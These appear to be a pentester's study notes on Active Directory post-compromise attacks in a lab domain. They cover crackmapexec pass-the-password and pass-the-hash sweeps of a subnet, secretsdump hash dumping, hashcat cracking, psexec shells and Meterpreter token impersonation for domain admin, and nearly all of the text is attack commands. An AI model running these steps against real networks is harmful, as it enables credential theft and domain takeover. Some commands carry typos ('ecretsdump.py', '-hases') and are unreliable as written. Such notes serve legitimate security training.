## Post compromise exploitation
Must have some creds or a shell.
### Pass the password
Using crackmapexec, pass passwd (credentials found) to all pcs on a subnet/ip-range and see where we can pwn.
```bash
crackmapexec smb 172.25.64.0/20 -u solaire -d SOULS.local -p Password1
```
or
```bash
crackmapexec smb 172.25.64.0/20 -u solaire -p Password1 --local-auth
```
### Dumping hashes
If you have credentials (of user with admin rights) for 1 or more machines (same user can have access to more than 1), use secretsdump.py (part of impacket) to dump hashes:
```bash
ecretsdump.py <DOMAIN>/<USER>@<COMPUTER-IP>
```
### Craching Hashes with hashcat
- Secretsdump.py gives hashes of NTLM type (previously we got NTLMv2).
- We can pass around NTLM but not NTLMv2.
- Do: `hashcat --help | grep <hash-type>` to get the code
- `hashcat -m <code> <txt files with hash> SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --force`

### Pass the hash
```bash
crackmapexec smb 172.25.64.0/20 -u solaire -H <hash> --local-auth
```
Note: if it says `pwned` then surely the hash/passwd worked. But if its green there is a possibility it didnt work (false +ve).<br>
* If you find most pcs pwned or green in crackmapexec, you can use psexec to get a shell:
```bash
psexec.py "user name":@<ip> -hases LMHASH:NTHASH
```

### Token impersonation
- If you have creds/hash, get meterpreter shell via psexec (msfconsole).
- In meterpreter, `load incognito` to load incognito tool.
- Type: `list_tokens -u`.
- See which tokens available (dommain\\admin will be most severe)
- Type `impersonate_token domain\\administrator` to impersonate user. 
- Now domain admin shell. lesgo.
- Can also find user tokens, whenever users log in (delegate token) and get shell as that user. 
